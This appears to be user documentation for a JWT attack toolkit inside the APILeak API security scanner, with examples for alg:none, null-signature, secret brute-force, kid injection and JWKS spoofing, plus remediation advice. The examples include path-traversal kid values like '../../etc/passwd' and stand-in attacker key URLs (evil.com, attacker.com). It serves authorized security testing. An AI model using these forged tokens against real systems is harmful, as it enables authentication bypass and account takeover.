# JWT Attack Testing

The `jwt` command group is APILeak's **manual, operator-driven JWT toolkit**. It bundles
everyday JWT utilities (decode, encode, verify, key generation, JWKS conversion) together
with attack primitives (algorithm confusion, null-signature bypass, weak-secret brute-force,
kid injection, JWKS spoofing, inline JWKS injection) and a comprehensive automated attack
runner. You run these commands by hand, on your own timeline, to craft tokens and probe a
target's JWT handling.

## Manual toolkit vs. automated scan detection

APILeak has **two distinct paths** for JWT security. Use the right one for the job.

| | Manual `jwt` group | Automated detection in a scan |
|---|---|---|
| **What it is** | The `jwt` command group documented on this page. | The **JWT_Module_Tests** performed by the `owasp auth` module. |
| **How you run it** | By hand: `python apileaks.py jwt <sub> ...` | As part of an orchestrated run: `python apileaks.py scan ...` or `python apileaks.py owasp auth ...` |
| **What it does** | Utilities + attack primitives. Generates tokens for manual testing when no `--url` is given, or executes an attack against a live endpoint when `--url` is provided. | The algorithm-confusion and expired-token-acceptance checks that run automatically as part of the auth module. |
| **How it's configured** | Per-command options (`--payload`, `--kid-payload`, `--jwks-url`, `--secret`, etc.) | `--public-key`, `--jwks-url`, and `--signing-secret` on `scan` / `owasp auth`. |

**Rule of thumb:**

- Want automated JWT detection as part of a scan? Use **`owasp auth`** (or **`scan`**, which
  runs the auth module among others). The algorithm-confusion test can be given real RSA public
  key material via `--public-key` (or fetched via `--jwks-url`), and the expired-token-acceptance
  test can be given a known HMAC secret via `--signing-secret`.
- Want hands-on manual attacks and JWT utilities? Use the **`jwt`** group described here.

For the automated auth module, see the `owasp auth` command (`python apileaks.py owasp auth --help`),
the OWASP module docs in [`docs/owasp/`](owasp/) (planned: `docs/owasp/auth-testing.md`), and the
[OWASP Modules Guide](owasp-modules-guide.md).

> Orchestrated scans use `scan` (or a single-module `owasp <module>`). The old `full` command is a
> deprecated hidden alias of `scan` and prints a deprecation notice — prefer `scan`.

## How the attack subcommands work

Every `test-*` subcommand and `attack-test` shares the same engine model:

- **No `--url` → offline token generation.** The command decodes your base token, builds the
  attack tokens through the single-source-of-truth `JWTAttackEngine`, and prints them so you can
  test them by hand. This makes the toolkit useful even without a live target.
- **`--url` given → live execution.** The forged tokens are sent to the target through APILeak's
  shared HTTP request engine, which applies rate limiting, proxy support, User-Agent rotation, and
  TLS handling consistently with the rest of the tool.
- **Success is decided by the response analyzer**, not by keyword matching. The engine compares
  each attack response against a baseline (the original token) and assigns a confidence score. It
  does **not** simply look for words like "admin" or "dashboard" in the body.

## Shared live-endpoint options

Every `test-*` subcommand and `attack-test` accepts these options for live testing:

- `-u`, `--url` — target URL to test the attack against (optional; omit for offline generation).
- `-H`, `--header` — custom header in `"Name: Value"` format. Repeatable.
- `-d`, `--data` — POST data for the request body.
- `--timeout` — request timeout in seconds (default: `30`).

`attack-test` adds a few of its own (`--no-ssl-verify`, `--max-retries`, `--fuzz-target`,
`--vector-file`, `--raw-request`, `--canary`) — see its section below. These extra options are
**not** available on the individual `test-*` subcommands.

## Quick start

```bash
# Decode and inspect a token
python apileaks.py jwt decode TOKEN

# Create a token for manual testing
python apileaks.py jwt encode '{"sub":"user123","role":"user"}' --secret mysecret

# Try an alg:none attack offline (prints the forged token)
python apileaks.py jwt test-alg-none TOKEN

# Try the same attack against a live endpoint
python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/protected

# Run the full automated attack suite against a live endpoint
python apileaks.py jwt attack-test TOKEN --url https://api.example.com/protected
```

## Subcommands

The `jwt` group has exactly **12** subcommands: five utilities (`decode`, `encode`, `verify`,
`genkey`, `jwks-to-key`) and seven attack commands (`test-alg-none`, `test-null-signature`,
`brute-secret`, `test-kid-injection`, `test-jwks-spoof`, `test-inline-jwks`, `attack-test`).

---

### 1. `jwt decode` — decode & analyze a token

**Purpose:** Decode a JWT into its header, payload, and signature and print an analysis plus a
JSON representation. No verification, no network.

**Syntax:**

```bash
python apileaks.py jwt decode TOKEN
```

**Arguments/options:**

- `TOKEN` (positional, required) — the JWT to decode.

**Example:**

```bash
python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.abc
```

The output includes header analysis (algorithm, type), payload claims (`sub`, `exp`, `iat`, …),
signature information, and a `📄 JSON Output` block for programmatic use.

---

### 2. `jwt encode` — create a token

**Purpose:** Build (and HMAC-sign) a JWT from a custom payload and header. Useful for producing
base tokens to feed into the attack subcommands, or for manual testing.

**Syntax:**

```bash
python apileaks.py jwt encode PAYLOAD [--header HEADER_JSON] [--secret SECRET]
```

**Arguments/options:**

- `PAYLOAD` (positional, required) — JWT payload as a JSON string.
- `--header` — JWT header as a JSON string (default: `{"alg":"HS256","typ":"JWT"}`).
- `--secret` — secret key used for signing (default: `secret`).

**Examples:**

```bash
# Minimal token with default header and default secret
python apileaks.py jwt encode '{"sub":"user123","role":"user"}'

# Custom secret
python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret

# Custom header and secret
python apileaks.py jwt encode '{"sub":"admin","role":"admin"}' \
  --header '{"alg":"HS256","typ":"JWT","kid":"1"}' \
  --secret mysecret
```

---

### 3. `jwt verify` — verify a signature (no network)

**Purpose:** Verify a token's signature against supplied key material. The command dispatches on
the token's header algorithm: `HS*` uses the shared `--secret`, while `RS*`/`PS*`/`ES*` use the
public key from `--key-file`, `--pem`, or `--jwks`. **No HTTP request is issued.**

**Syntax:**

```bash
python apileaks.py jwt verify TOKEN [--secret SECRET] [--key-file PATH] [--pem PEM] [--jwks PATH]
```

**Arguments/options:**

- `TOKEN` (positional, required) — the JWT to verify.
- `--secret` — shared secret for HMAC (`HS*`) verification.
- `--key-file` — path to a PEM/DER public key or certificate file.
- `--pem` — inline PEM public key or certificate material.
- `--jwks` — path to a local JWKS file (a single JWK entry or `{"keys": [...]}`).

**Examples:**

```bash
# HMAC verification with a shared secret
python apileaks.py jwt verify TOKEN --secret mysecret

# Asymmetric verification against a public key file
python apileaks.py jwt verify TOKEN --key-file public.pem

# Inline PEM
python apileaks.py jwt verify TOKEN --pem "$(cat public.pem)"

# Verify against a local JWKS
python apileaks.py jwt verify TOKEN --jwks jwks.json
```

A failed verification is reported as `❌ INVALID` (exit code `1`); it is a result, not an error.

---

### 4. `jwt genkey` — generate a test keypair

**Purpose:** Generate a test RSA or EC keypair and print both the private and public PEM material.
Local-only, **no network**. Handy for producing keys to use with `verify`, `jwks-to-key`, or
asymmetric-confusion experiments.

**Syntax:**

```bash
python apileaks.py jwt genkey [--type rsa|ec] [--bits BITS] [--curve ES256|ES384|ES512]
```

**Arguments/options:**

- `--type` — keypair type, `rsa` or `ec` (default: `rsa`).
- `--bits` — RSA modulus size in bits, used when `--type rsa` (default: `2048`).
- `--curve` — EC curve/algorithm, one of `ES256`, `ES384`, `ES512`, used when `--type ec`
  (default: `ES256`).

**Examples:**

```bash
# Default 2048-bit RSA keypair
python apileaks.py jwt genkey --type rsa

# Stronger RSA key
python apileaks.py jwt genkey --type rsa --bits 4096

# EC keypair on the P-256 curve
python apileaks.py jwt genkey --type ec --curve ES256
```

---

### 5. `jwt jwks-to-key` — reconstruct a public key from a JWKS

**Purpose:** Reconstruct a usable public key PEM from a local JWKS entry, converting RSA `n`/`e` or
EC `crv`/`x`/`y` parameters. It reuses the same JWK-to-key conversion as the attack engine.
Local-only, **no network**.

**Syntax:**

```bash
python apileaks.py jwt jwks-to-key --jwks PATH
```

**Arguments/options:**

- `--jwks` (required) — path to a JWKS file (a single JWK entry or `{"keys": [...]}`; the first
  key is used).

**Example:**

```bash
python apileaks.py jwt jwks-to-key --jwks jwks.json
```

Unparseable input or a JWK missing required parameters is rejected with a descriptive error.

---

### 6. `jwt test-alg-none` — algorithm confusion (alg:none)

**Purpose:** Test the classic algorithm-confusion attack by rewriting the header algorithm to
`none` and removing the signature, then (if a payload is supplied) injecting escalated claims.

**Severity:** CRITICAL — authentication completely nullified.

**Syntax:**

```bash
python apileaks.py jwt test-alg-none TOKEN [--payload JSON] \
  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
```

**Arguments/options:**

- `TOKEN` (positional, required) — base token.
- `--payload` — custom claims to merge onto the base payload (JSON).
- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.

**Examples:**

```bash
# Offline: generate and print the alg:none token
python apileaks.py jwt test-alg-none TOKEN

# Offline with escalated claims
python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'

# Live endpoint
python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
```

---

### 7. `jwt test-null-signature` — null signature bypass

**Purpose:** Test acceptance of empty/null signatures (e.g. `header.payload.`), optionally merging
escalated claims onto the payload.

**Severity:** CRITICAL — cryptographic validation bypass.

**Syntax:**

```bash
python apileaks.py jwt test-null-signature TOKEN [--payload JSON] \
  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
```

**Arguments/options:**

- `TOKEN` (positional, required) — base token.
- `--payload` — custom claims to merge onto the base payload (JSON).
- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.

**Examples:**

```bash
# Offline generation
python apileaks.py jwt test-null-signature TOKEN

# With an admin payload
python apileaks.py jwt test-null-signature TOKEN --payload '{"sub":"admin","admin":true}'

# Live endpoint
python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/protected --timeout 30
```

---

### 8. `jwt brute-secret` — brute-force weak HMAC secrets

**Purpose:** Recover a weak `HS*` signing secret by trying candidates from a wordlist and verifying
each against the token's real signature. On success, it forges privilege-escalation, impersonation,
and expiration-bypass tokens with the recovered secret; with `--url` it also tests them live.

**Severity:** CRITICAL — complete authentication compromise.

**Syntax:**

```bash
python apileaks.py jwt brute-secret TOKEN [-w WORDLIST] [--max-attempts N] \
  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
```

**Arguments/options:**

- `TOKEN` (positional, required) — base token (must use an `HS*` algorithm to be crackable).
- `-w`, `--wordlist` — wordlist file for the secret brute-force (default: `wordlists/jwt_secrets.txt`;
  a default wordlist is created if the path does not exist).
- `--max-attempts` — maximum number of candidate secrets to try (default: `1000`).
- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.

**Examples:**

```bash
# Offline: crack the secret and print the forged exploitation tokens
python apileaks.py jwt brute-secret TOKEN

# Custom wordlist and attempt cap
python apileaks.py jwt brute-secret TOKEN --wordlist custom_secrets.txt --max-attempts 5000

# Crack + test exploitation against a live endpoint
python apileaks.py jwt brute-secret TOKEN \
  --url https://api.example.com/admin \
  --header "X-API-Key: key123" \
  --data '{"action": "read"}' \
  --timeout 60
```

If the secret is not in the wordlist, the command reports that and stops — no tokens are forged.

---

### 9. `jwt test-kid-injection` — Key ID (kid) injection

**Purpose:** Test Key ID (`kid`) header injection. The engine owns a curated set of `kid` payloads
(path traversal, remote URLs, injection strings); `--kid-payload` overrides the primary value and
`--payload` merges escalated claims.

**Severity:** HIGH → CRITICAL (depends on backend).

**Syntax:**

```bash
python apileaks.py jwt test-kid-injection TOKEN [--kid-payload VALUE] [--payload JSON] \
  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
```

**Arguments/options:**

- `TOKEN` (positional, required) — base token.
- `--kid-payload` — value injected into the `kid` header (default: `../../etc/passwd`).
- `--payload` — custom claims to merge onto the base payload (JSON).
- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.

**Examples:**

```bash
# Offline with the default kid payload
python apileaks.py jwt test-kid-injection TOKEN

# Remote key URL
python apileaks.py jwt test-kid-injection TOKEN --kid-payload "http://evil.com/key.pem"

# Escalated claims
python apileaks.py jwt test-kid-injection TOKEN --payload '{"sub":"admin","role":"admin"}'

# Both, against a live endpoint
python apileaks.py jwt test-kid-injection TOKEN \
  --kid-payload "../../etc/passwd" \
  --payload '{"admin":true}' \
  --url https://api.example.com/protected
```

Common `--kid-payload` ideas: path traversal (`../../etc/passwd`), remote URLs
(`http://attacker.com/key.pem`), command/SQL injection strings for vulnerable parsers.

---

### 10. `jwt test-jwks-spoof` — JWKS URL (jku) spoofing

**Purpose:** Test whether the server trusts an attacker-controlled JWKS/`jku` URL. The engine signs
with the resolved attacker key and points the token at the spoofed URL.

**Severity:** CRITICAL — trust boundary broken.

**Syntax:**

```bash
python apileaks.py jwt test-jwks-spoof TOKEN [--jwks-url URL] \
  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
```

**Arguments/options:**

- `TOKEN` (positional, required) — base token.
- `--jwks-url` — the malicious JWKS URL to advertise (default: `http://attacker.com/jwks.json`).
- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.

> Note: `--jwks-url` here is the **attacker-controlled** JWKS URL embedded in the crafted token.
> This is different from the `--jwks-url` on `scan`/`owasp auth`, which points to a **legitimate**
> JWKS endpoint used to fetch real public-key material for the automated algorithm-confusion test.

**Examples:**

```bash
# Offline generation with the default malicious URL
python apileaks.py jwt test-jwks-spoof TOKEN

# Custom malicious JWKS URL
python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json

# Live endpoint
python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/protected
```

---

### 11. `jwt test-inline-jwks` — inline JWKS injection

**Purpose:** Test whether the server trusts a public key embedded directly in the token header
(inline `jwk`). The engine generates its own keypair, embeds the public key inline, and signs with
the matching private key.

**Severity:** CRITICAL — total cryptographic control.

**Syntax:**

```bash
python apileaks.py jwt test-inline-jwks TOKEN \
  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
```

**Arguments/options:**

- `TOKEN` (positional, required) — base token.
- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.

**Examples:**

```bash
# Offline generation
python apileaks.py jwt test-inline-jwks TOKEN

# Live endpoint
python apileaks.py jwt test-inline-jwks TOKEN --url https://api.example.com/admin

# Live endpoint with a custom header
python apileaks.py jwt test-inline-jwks TOKEN -u https://api.example.com/admin -H "X-API-Key: key123"
```

---

### 12. `jwt attack-test` — comprehensive automated suite

**Purpose:** Run APILeak's full JWT attack suite against a live endpoint and produce a vulnerability
assessment with baseline comparison and confidence scoring. It exercises algorithm confusion,
null/empty signatures, weak-secret brute-force, kid injection, JWKS spoofing, inline JWKS injection,
and payload manipulation (privilege escalation, impersonation, expiration bypass).

**Severity:** CRITICAL — all attack vectors.

**Syntax:**

```bash
python apileaks.py jwt attack-test [TOKEN] [-u URL] [-H "Name: Value"]... [-d DATA] \
  [--timeout SECONDS] [--no-ssl-verify] [--max-retries N] \
  [--fuzz-target NAME] [--vector-file PATH] [--raw-request PATH] [--canary STRING]
```

**Arguments/options:**

- `TOKEN` (positional, optional) — base token. May be supplied instead via `--raw-request`.
- `-u`, `--url` — target endpoint URL to test attacks against.
- `-H`, `--header` — custom header, `"Name: Value"`. Repeatable.
- `-d`, `--data` — POST data for the request body (JSON recommended).
- `--timeout` — request timeout in seconds (default: `30`).
- `--no-ssl-verify` — disable TLS certificate verification (testing environments only).
- `--max-retries` — maximum retry attempts for failed requests (default: `3`).
- `--fuzz-target` — a claim or header name to fuzz using values from `--vector-file`.
- `--vector-file` — a file of fuzz values (one per line) substituted into `--fuzz-target`.
- `--raw-request` — a raw HTTP request file that supplies the request context and JWT.
- `--canary` — an expected-success string that *corroborates* (never replaces) analyzer success.

**Examples:**

```bash
# Full suite against a protected endpoint
python apileaks.py jwt attack-test eyJ0eXAiOiJKV1Q... --url https://api.example.com/user/profile

# With a custom auth header
python apileaks.py jwt attack-test TOKEN -u https://api.example.com/admin -H "X-API-Key: secret123"

# POST endpoint with a JSON body
python apileaks.py jwt attack-test TOKEN \
  -u https://api.example.com/transactions \
  -d '{"amount": 100, "currency": "USD", "recipient": "user123"}' \
  -H "Content-Type: application/json" \
  --timeout 60 --max-retries 5

# Self-signed dev endpoint
python apileaks.py jwt attack-test TOKEN -u https://dev-api.local/protected --no-ssl-verify

# Fuzz a specific claim with a vector file
python apileaks.py jwt attack-test TOKEN -u https://api.example.com/protected \
  --fuzz-target role --vector-file wordlists/roles.txt

# Drive the run from a raw HTTP request file, corroborated by a canary string
python apileaks.py jwt attack-test -u https://api.example.com/protected \
  --raw-request request.txt --canary '"role":"admin"'
```

## Manual JWT workflow

A typical hands-on assessment with the `jwt` group:

1. **Decode and understand the token.**

   ```bash
   python apileaks.py jwt decode "$TOKEN"
   ```

   Note the algorithm (`HS*` vs `RS*`/`ES*`), the claims you might escalate (`role`, `sub`,
   `scope`, `admin`), and the expiry (`exp`).

2. **(Optional) Reproduce/verify signing.** If you suspect a weak secret or have key material, use
   `verify` (and `genkey` / `jwks-to-key` to prepare keys):

   ```bash
   python apileaks.py jwt verify "$TOKEN" --secret secret
   python apileaks.py jwt genkey --type rsa --bits 2048
   python apileaks.py jwt jwks-to-key --jwks jwks.json
   ```

3. **Generate attack tokens offline** (no `--url`) to inspect exactly what will be sent:

   ```bash
   python apileaks.py jwt test-alg-none "$TOKEN"
   python apileaks.py jwt test-null-signature "$TOKEN"
   python apileaks.py jwt brute-secret "$TOKEN" -w wordlists/jwt_secrets.txt
   python apileaks.py jwt test-kid-injection "$TOKEN"
   python apileaks.py jwt test-jwks-spoof "$TOKEN"
   python apileaks.py jwt test-inline-jwks "$TOKEN"
   ```

4. **Fire individual attacks at a live endpoint** by adding `--url` (plus headers/data as needed):

   ```bash
   python apileaks.py jwt test-alg-none "$TOKEN" --url "$TARGET"
   python apileaks.py jwt brute-secret "$TOKEN" --url "$TARGET" -H "X-API-Key: key123"
   ```

5. **Run the comprehensive suite** with `attack-test` to cover every vector at once and get a
   scored assessment:

   ```bash
   python apileaks.py jwt attack-test "$TOKEN" --url "$TARGET"
   ```

For an automated JWT check as part of a broader scan (rather than these manual steps), run the auth
module instead — see the next section.

## Success criteria and severity

Attack success is determined by the engine's **response analyzer**: it compares each attack
response against a baseline established with the original token and assigns a confidence score. It
does not rely on keyword matching for success. Signals it weighs include:

- Status-code changes relative to baseline (e.g. an attack token that gets `2xx` where the
  tampered-but-unsigned token should be rejected).
- Response body/size differences that indicate privileged content or a broken validation path.
- Absence of the expected authorization failure.

Severity guidance:

- **🚨 CRITICAL** — complete authentication bypass, file disclosure, or RCE.
- **🟠 HIGH** — privilege escalation or user impersonation.
- **🟡 MEDIUM** — information disclosure or timing signals.

### Exit codes

- `0` — no vulnerabilities, or low/medium severity only.
- `1` — high-severity vulnerabilities detected (or a command-level error).
- `2` — critical vulnerabilities detected.
- `130` — interrupted by the user (Ctrl+C).

## Automated JWT detection in a scan

To detect JWT weaknesses automatically during an orchestrated run, use the **auth module** rather
than the manual `jwt` group. The JWT_Module_Tests run as part of it:

```bash
# Run only the auth module against a target
python apileaks.py owasp auth --target https://api.example.com

# Orchestrated scan including the auth module
python apileaks.py scan --target https://api.example.com --modules bola,auth,property
```

The automated JWT checks are governed by these `scan` / `owasp auth` options:

- `--public-key` — RSA public-key material (PEM/DER path or inline PEM) used by the
  algorithm-confusion test to HMAC-sign with the real key bytes.
- `--jwks-url` — a JWKS endpoint URL used to fetch RSA public-key material for the
  algorithm-confusion test when `--public-key` is not supplied.
- `--signing-secret` — a known HMAC signing secret used to construct a validly-signed but expired
  token for the expired-token-acceptance test.

Example:

```bash
python apileaks.py owasp auth --target https://api.example.com \
  --public-key ./idp_public.pem \
  --signing-secret 's3cr3t'
```

See [OWASP Modules Guide](owasp-modules-guide.md) and the docs under [`docs/owasp/`](owasp/) for
full details on the auth module.

## Security considerations

### Ethical usage

- Only test systems you own or are explicitly authorized to test.
- Be mindful of rate limits — attacks generate multiple requests (the shared engine's rate limiting
  helps here).
- Some attacks may trigger monitoring/alerting; coordinate with defenders where appropriate.
- Verify results manually before reporting.

### Remediation guidance

**Algorithm confusion (alg:none / downgrade):**
- Configure the JWT library to reject `alg:none` tokens.
- Enforce an algorithm allowlist (e.g. only `HS256` or `RS256`).
- Never trust the algorithm named in the JWT header.
- Use vetted JWT libraries, not custom verification.

**Null/empty signature:**
- Reject tokens with empty or missing signatures before cryptographic verification.
- Validate signature presence, length, and format.

**Weak HMAC secrets:**
- Use strong, randomly generated secrets (32+ characters).
- Prefer asymmetric algorithms (RS256) where practical.
- Rotate secrets and never ship default/common secrets.

**Key ID (kid) injection:**
- Validate and sanitize `kid` before use; use an allowlist of key identifiers.
- Never use `kid` directly in file paths or URLs; guard against path traversal.
- Avoid dynamic key loading driven by user input.

**JWKS spoofing / inline JWKS:**
- Enforce a JWKS URL allowlist and validate URLs against strict patterns.
- Reject user-controlled `jku`, `x5u`, `jwk`, and `x5c` parameters.
- Prefer static key stores and certificate pinning over dynamic fetching.

## Integration with APILeak

The `--jwt` option lets discovery and scan commands authenticate with a token:

```bash
# JWT-authenticated orchestrated scan (auth module runs the automated JWT tests)
python apileaks.py scan \
  --target https://api.example.com \
  --jwt "eyJ0eXAiOiJKV1Q..." \
  --modules bola,auth,property

# JWT-authenticated parameter fuzzing
python apileaks.py par \
  --target https://api.example.com/protected \
  --jwt "eyJ0eXAiOiJKV1Q..." \
  --wordlist wordlists/parameters.txt

# JWT-authenticated endpoint discovery
python apileaks.py dir \
  --target https://api.example.com \
  --jwt "eyJ0eXAiOiJKV1Q..." \
  --wordlist wordlists/admin_endpoints.txt
```

## Troubleshooting

**Invalid JWT token format**

```
❌ Error decoding JWT: Invalid JWT format - must have 3 parts separated by dots
```

Ensure the token has the form `header.payload.signature`.

**Network timeouts**

```
❌ Request failed: timeout
```

Increase the timeout, e.g. `--timeout 60`.

**TLS certificate errors (attack-test only)**

For self-signed certificates in a test environment, `attack-test` supports `--no-ssl-verify`. Use
this only against systems you control.

## References

- [RFC 7519 — JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 — JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
- [RFC 7517 — JSON Web Key (JWK)](https://tools.ietf.org/html/rfc7517)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

For more on APILeak's other capabilities, see:
- [OWASP Testing Guide](owasp-modules-guide.md)
- [User Guide](user-guide.md)
- [Usage Examples](usage-examples.md)
